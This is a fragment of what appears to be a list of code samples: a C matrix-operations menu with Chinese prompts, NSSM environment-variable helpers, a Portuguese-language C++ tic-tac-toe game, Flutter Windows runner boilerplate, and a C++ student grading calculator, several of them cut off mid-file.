b[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(m<=0||n<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\uff1a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t            for(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            b[i][j]=a[j][i];\r\n\t\t            }\r\n\t            }\r\n\t            printf(\"\u8fd9\u662f\u8f6c\u7f6e\u77e9\u9635\uff1a\\n\");\r\n\t            for(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",b[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n               \t}\r\n               \tprintf(\"\\n\");\r\n               \tprintf(\"\u9009\u62e90\u9000\u51fa\uff0c\u6216\u9009\u62e9\u4e0b\u4e00\u4e2a\u60f3\u6267\u884c\u7684\u529f\u80fd\\n\"); \r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tcase(2):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u5728\u8fd9\u91cc\u8fdb\u884c\u77e9\u9635\u52a0\u6cd5\uff1a\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&p,&q);\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*p);\r\n\t            int w;\r\n\t            for(w=0;w<p;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*q);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **c=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            c[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(p!=m||q!=n)//\u4e0d\u80fd\u76f8\u52a0\u91cd\u65b0\u8f93\u5165 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u8fd9\u4e24\u4e2a\u77e9\u9635\u4e0d\u80fd\u76f8\u52a0\u3002\\n\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u91cd\u65b0\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570,\u4f7f\u4e4b\u4e0e\u77e9\u9635a\u7684\u884c\u6570\u5217\u6570\u4e00\u81f4\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\t}\r\n\t\t\t\twhile(m<=0||n<=0||p<=0||q<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&p,&q);\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<p;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<q;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&b[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\u4e24\u4e2a\u77e9\u9635\u76f8\u52a0\u7ed3\u679c\u4e3a\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            c[i][j]=a[i][j]+b[i][j];//\u76f8\u52a0\u8ba1\u7b97 \r\n\t\t            }\r\n\t            }\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",c[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n\t            }\r\n\t            printf(\"\\n\");\r\n               \t",
    "#include \"nssm.h\"\r\n\r\n/*\r\n  Environment block is of the form:\r\n\r\n    KEY1=VALUE1 NULL\r\n    KEY2=VALUE2 NULL\r\n    NULL\r\n\r\n  A single variable KEY=VALUE has length 15:\r\n\r\n    KEY=VALUE (13) NULL (1)\r\n    NULL (1)\r\n\r\n  Environment variable names are case-insensitive!\r\n*/\r\n\r\n/* Find the length in characters of an environment block. */\r\nsize_t environment_length(TCHAR *env) {\r\n  size_t len = 0;\r\n\r\n  TCHAR *s;\r\n  for (s = env; ; s++) {\r\n    len++;\r\n    if (*s == _T('\\0')) {\r\n      if (*(s + 1) == _T('\\0')) {\r\n        len++;\r\n        break;\r\n      }\r\n    }\r\n  }\r\n\r\n  return len;\r\n}\r\n\r\n/* Copy an environment block. */\r\nTCHAR *copy_environment_block(TCHAR *env) {\r\n  TCHAR *newenv;\r\n  if (copy_double_null(env, (unsigned long) environment_length(env), &newenv)) return 0;\r\n  return newenv;\r\n}\r\n\r\n/*\r\n  The environment block starts with variables of the form\r\n  =C:=C:\\Windows\\System32 which we ignore.\r\n*/\r\nTCHAR *useful_environment(TCHAR *rawenv) {\r\n  TCHAR *env = rawenv;\r\n\r\n  if (env) {\r\n    while (*env == _T('=')) {\r\n      for ( ; *env; env++);\r\n      env++;\r\n    }\r\n  }\r\n\r\n  return env;\r\n}\r\n\r\n/* Expand an environment variable.  Must call HeapFree() on the result. */\r\nTCHAR *expand_environment_string(TCHAR *string) {\r\n  unsigned long len;\r\n\r\n  len = ExpandEnvironmentStrings(string, 0, 0);\r\n  if (! len) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_EXPANDENVIRONMENTSTRINGS_FAILED, string, error_string(GetLastError()), 0);\r\n    return 0;\r\n  }\r\n\r\n  TCHAR *ret = (TCHAR *) HeapAlloc(GetProcessHeap(), 0, len * sizeof(TCHAR));\r\n  if (! ret) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_OUT_OF_MEMORY, _T(\"ExpandEnvironmentStrings()\"), _T(\"expand_environment_string\"), 0);\r\n    return 0;\r\n  }\r\n\r\n  if (! ExpandEnvironmentStrings(string, ret, len)) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_EXPANDENVIRONMENTSTRINGS_FAILED, string, error_string(GetLastError()), 0);\r\n    HeapFree(GetProcessHeap(), 0, ret);\r\n    return 0;\r\n  }\r\n\r\n  return ret;\r\n}\r\n\r\n/*\r\n  Set all the environment variables from an environment block in the current\r\n  environment or remove all the variables in the block from the current\r\n  environment.\r\n*/\r\nstatic int set_environment_block(TCHAR *env, bool set) {\r\n  int ret = 0;\r\n\r\n  TCHAR *s, *t;\r\n  for (s = env; *s; s++) {\r\n    for (t = s; *t && *t != _T('='); t++);\r\n    if (*t == _T('=')) {\r\n      *t = _T('\\0');\r\n      if (set) {\r\n        TCHAR *expanded = expand_environment_string(++t);\r\n        if (expanded) {\r\n          if (! SetEnvironmentVariable(s, expanded)) ret++;\r\n          HeapFree(GetProcessHeap(), 0, expanded);\r\n        }\r\n        else {\r\n          if (! SetEnvironmentVariable(s, t)) ret++;\r\n        }\r\n      }\r\n      else {\r\n        if (! SetEnvironmentVariable(s, NULL)) ret++;\r\n      }\r\n      for (t++; *t; t++);\r\n    }\r\n    s = t;\r\n  }\r\n\r\n  return ret;\r\n}\r\n\r\nint set_environment_block(TCHAR *env) {\r\n  return set_environment_block(env, true);\r\n}\r\n\r\nstatic int unset_environment_block(TCHAR *env) {\r\n  return set_environment_block(env, false);\r\n}\r\n\r\n/* Remove all variables from the process environment. */\r\nint clear_environment() {\r\n  TCHAR *rawenv = GetEnvironmentStrings();\r\n  TCHAR *env = useful_environment(rawenv);\r\n\r\n  int ret = unset_environment_block(env);\r\n\r\n  if (rawenv) FreeEnvironmentStrings(rawenv);\r\n\r\n  return ret;\r\n}\r\n\r\n/* Set the current environment to exactly duplicate an environment block. */\r\nint duplicate_environment(TCHAR *rawenv) {\r\n  int ret = clear_environment();\r\n  TCHAR *env = useful_environment(rawenv);\r\n  ret += set_environment_block(env);\r\n  return ret;\r\n}\r\n\r\n/*\r\n  Verify an environment block.\r\n  Returns:  1 if environment is invalid.\r\n            0 if environment is OK.\r\n           -1 on error.\r\n*/\r\nint test_environment(TCHAR *env) {\r\n  TCHAR *path = (TCHAR *) nssm_imagepath();\r\n  STARTUPINFO si;\r\n  ZeroMemory(&si, sizeof(si));\r\n  si.cb = sizeof(si);\r\n  PROCESS_INFORMATION pi;\r\n  ZeroMemory(&pi, sizeof(pi));\r\n  unsigned long flags = CREATE_SUSPENDED;\r\n#ifdef UNICODE\r\n  flags |= CREATE_UNICODE_ENVIRONMENT;\r\n#endif\r\n\r\n  /*\r\n    Try to relaunch ourselves but with the candidate environment set.\r\n    Assuming no solar flare activity, the only reason this would fail is if\r\n    the environment were invalid.\r\n  */\r\n  if (CreateProcess(0, path, 0, 0, 0, flags, env, 0, &si, &pi)) {\r\n    TerminateProcess(pi.hProcess, 0);\r\n  }\r\n  else {\r\n    unsigned long error = GetLastError();\r\n    if (error == ERROR_INVALID_PARAMETER) return 1;\r\n    else return -1;\r\n  }\r\n\r\n  return 0;\r\n}\r\n\r\n/*\r\n  Duplicate an environment block returned by GetEnvironmentStrings().\r\n  Since such a block is by definition readonly, and duplicate_environment()\r\n  modifies its inputs, this function takes a copy of the input and operates\r\n  on that.\r\n*/\r\nvoid duplicate_environment_strings(TCHAR *env) {\r\n  TCHAR *newenv = copy_environment_block(env);\r\n  if (! newenv) return;\r\n\r\n  duplicate_environment(newenv);\r\n  HeapFree(GetProcessHeap(), 0, newenv);\r\n}\r\n\r\n/* Safely get a copy of the current environment. */\r\nTCHAR *copy_e",
    "#include <iostream>\r\n#include <ctime>\r\n\r\nvoid drawBoard(char *spaces);\r\nvoid playerMove(char *spaces, char player);\r\nvoid computerMove(char *spaces, char computer);\r\nbool checkWinner(char *spaces, char player, char computer);\r\nbool checkTie(char *spaces);\r\n\r\nint main() {\r\n    char player = 'X';\r\n    char computer = 'O';\r\n    char spaces[9] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '};\r\n    bool winner, tie;\r\n    drawBoard(spaces);\r\n\r\n    while(true) {\r\n        playerMove(spaces, player);\r\n        drawBoard(spaces);\r\n\r\n        winner = checkWinner(spaces, player, computer);\r\n        if (winner) {\r\n            break;\r\n        }\r\n        tie = checkTie(spaces);\r\n        if (tie) {\r\n            break;\r\n        }\r\n        computerMove(spaces, computer);\r\n        drawBoard(spaces);\r\n\r\n        winner = checkWinner(spaces, player, computer);\r\n        if (winner) {\r\n            break;\r\n        }\r\n        tie = checkTie(spaces);\r\n        if (tie) {\r\n            break;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nvoid drawBoard(char *spaces){\r\n    std::cout << '\\n';\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << \"  \" << spaces[0] <<\"  |  \"<< spaces[1] <<\"  |  \" << spaces[2] << \"  \" << std::endl;\r\n    std::cout << \"_____|_____|_____\" << std::endl;\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << \"  \" << spaces[3] <<\"  |  \"<< spaces[4] <<\"  |  \" << spaces[5] << \"  \" << std::endl;\r\n    std::cout << \"_____|_____|_____\" << std::endl;\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << \"  \" << spaces[6] <<\"  |  \"<< spaces[7] <<\"  |  \" << spaces[8] << \"  \" << std::endl;\r\n    std::cout << \"     |     |     \" << std::endl;\r\n    std::cout << '\\n';\r\n}\r\nvoid playerMove(char *spaces, char player){\r\n    int pos;\r\n    while(true){\r\n        std::cout << \"Escolha onde quer jogar [1-9]: \";\r\n        std::cin >> pos;\r\n        pos--;\r\n        if ((pos >= 0 && pos <= 8) && spaces[pos] == ' ') {\r\n            spaces[pos] = player;\r\n            break;\r\n        }\r\n    }\r\n}\r\nvoid computerMove(char *spaces, char computer){\r\n    srand(time(0));\r\n    int pos;\r\n    while (true) {\r\n        pos = rand() % 9;\r\n        if (spaces[pos] == ' '){\r\n            spaces[pos] = computer;\r\n            return;\r\n        } \r\n    }\r\n}\r\nbool checkWinner(char *spaces, char player, char computer){\r\n    if (spaces[0] != ' ' && spaces[0] == spaces[1] && spaces[1] == spaces[2]){\r\n        // someone wins\r\n        if (spaces[0] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[3] != ' ' && spaces[3] == spaces[4] && spaces[4] == spaces[5]){\r\n        // someone wins\r\n        if (spaces[3] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[6] != ' ' && spaces[6] == spaces[7] && spaces[7] == spaces[8]){\r\n        // someone wins\r\n        if (spaces[6] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[0] != ' ' && spaces[0] == spaces[3] && spaces[3] == spaces[6]){\r\n        // someone wins\r\n        if (spaces[0] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[1] != ' ' && spaces[1] == spaces[4] && spaces[4] == spaces[7]){\r\n        // someone wins\r\n        if (spaces[1] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[2] != ' ' && spaces[2] == spaces[5] && spaces[5] == spaces[8]){\r\n        // someone wins\r\n        if (spaces[2] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[0] != ' ' && spaces[0] == spaces[4] && spaces[4] == spaces[8]){\r\n        // someone wins\r\n        if (spaces[0] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    else if (spaces[2] != ' ' && spaces[2] == spaces[4] && spaces[4] == spaces[6]){\r\n        // someone wins\r\n        if (spaces[2] == player) {\r\n            std::cout << \"VOCE GANHOU\" << std::endl;\r\n        } else {\r\n            std::cout << \"VOCE PERDEU\" << std::endl;\r\n        }\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\nbool checkTie(char *spaces){\r\n    for (int i=0; i < 9; i++) {\r\n        if (spaces[i] == ' ') {\r\n            return false;\r\n        }\r\n    }\r\n    std",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"coffee_shop_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter15_draggable_dragtarget_sizedbox_material\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n//#include <conio.h>\n#include <iomanip>\n#include <string>\n\nusing namespace std;\n\nfloat quizCalculator(int examQuant, float stuScore){\n    float finalScore;\n\n    finalScore = (stuScore / examQuant) * 100;\n    return finalScore;\n}\n\nfloat midtermCalculator(float cStanding, float mScore){\n    float cCS_Final;\n    float cME_Final;\n    float mExamAv;\n\n    cCS_Final = (60 * cStanding) / 100;\n    cME_Final = (40 * mScore) / 100;\n\n    mExamAv = cCS_Final + cME_Final;\n    return mExamAv;\n}\n\nfloat finalsCalculator(float fStanding, float fME, float fScore){\n    float fCS_Final;\n    float fME_Final;\n    float fFE_Final;\n    float fExamAv;\n\n    fCS_Final = (60 * fStanding) / 100;\n    fME_Final = (15 * fME) / 100;\n    fFE_Final = (25 * fScore) / 100;\n\n    fExamAv = fCS_Final + fME_Final + fFE_Final;\n    return fExamAv;\n}\n\nint main(){\n\n    string studentName;\n    float q_grade, m_grade, f_grade, gradePoint;\n    char pref;\n    char op;\n\n    // For Q\n    string qName;\n    int quantity;\n    float q_Score;\n\n    // For M\n    string mSubject;\n    float classStanding;\n    float mExamScore;\n\n    // For F\n    string fSubject;\n    float fClassStanding;\n    float fMScore;\n    float finalsScore;\n\n    // For G\n    string desc;\n    float scoreRaw;\n\n    // Startup Intro\n    cout<<\"X==================================X\"<<endl;\n    cout<<\"X            Welcome to            X\"<<endl;\n    cout<<\"X    Grading Calculator System     X\"<<endl;\n    cout<<\"X==================================X\"<<endl;\n    cout<<\"XxX Created by BMA-AM12 Students XxX\"<<endl;\n    cout<<endl<<endl;\n\n    // Do-while\n\n    do{\n        // Execute options\n        cout<<\"XX XX XX Please choose any options you would like to use: XX XX XX\"<<endl;\n        cout<<endl<<endl;\n        // Options initiated\n        cout<<\"XX:: [Q] Calculate Quiz/Exam Grade\"<<endl;\n        cout<<\"XX:: [M] Calculate Midterms Grade\"<<endl;\n        cout<<\"XX:: [F] Calculate Finals Grade\"<<endl;\n        cout<<\"XX:: [G] Check possible grade if...\"<<endl;\n        cout<<\"XX:: [X] Exit Program\\n\\n\";\n        cout<<\"[XX Your option XX] = >    \";\n\n        cin>>op;\n\n        // Option choice\n        switch (op) {\n            case 'Q':\n            case 'q':\n\n                cout<<\"[ YOUR OPTION IS Q ]\"<<endl;\n                cout<<endl;\n                cout<<\"[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]\\n\\n\";\n                cout<<\"XX: Enter student name: \";\n                cin>>studentName; /*Put data on studentName string*/\n                cout<<\"XX: Enter quiz/exam name: \";\n                cin>>qName;\n                cout<<\"XX: Enter quiz/exam's quantity/question amount: \";\n                cin>>quantity;\n                cout<<\"XX: Enter the examinee's answers written correctly (scores): \";\n                cin>>q_Score;\n\n                q_grade = quizCalculator(quantity, q_Score);\n                cout<<fixed<<setprecision(2);\n                cout<<\"\\n\\nYour student \"<<studentName<<\" got a score of \"<<q_grade<<\" percent on your quiz/exam \"<<qName<<\".\\n\\n\";\n                cout<<\"[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]\\n\\n\"<<endl;\n\n                break;\n\n            case 'M':\n            case 'm':\n                cout<<\"[ YOUR OPTION IS M ]\"<<endl;\n                cout<<endl;\n                cout<<\"[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]\\n\\n\";\n                cout<<\"XX: Enter student name: \";\n                cin>>studentName; /*Put data on studentName string*/\n                cout<<\"XX: Enter subject: \";\n                cin>>mSubject;\n                cout<<\"XX: Enter your student's class standing (in percentage)\\nFor reference, 60 percent is the contribution of class standing: \";\n                cin>>classStanding;\n                cout<<\"XX: Enter the student's midterm examination grade (in percentage)\\n(For reference, 40 percent is the contribution of midterm exam): \";\n                cin>>mExamScore;\n\n                if (classStanding > 100 || mExamScore > 100) {\n                    cout<<\"\\nXX: ERROR ! ERROR ! ERROR !\\nXX: Overall average is higher than expected!\\nXX: Please try again. Exiting option...\\n\";\n                } else {\n                    m_grade = midtermCalculator(classStanding, mExamScore);\n\n                    if (m_grade <= 79) {\n                        gradePoint = 0.5;\n                    } else if (m_grade >= 100) {\n                        gradePoint = 4.0;\n                        desc = \"Bruh\";\n                    } else if (m_grade >= 97) {\n                        gradePoint = 4.0;\n                        desc = \"Excellent\";\n                    } else if (m_grade >= 93) {\n                        gradePoint = 3.5;\n                        desc = \"Superior\";\n                    } else if (m_grade >= 89) {\n                        gradePoint = 3.0;\n                        desc = \"Very Good\";\n                    } else if (m_grade >= 85) {\n                        gradePoint = 2.5;\n                        desc = \"Good\";\n                    } else if (m_grade >= 80) {\n                        gradePoi",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
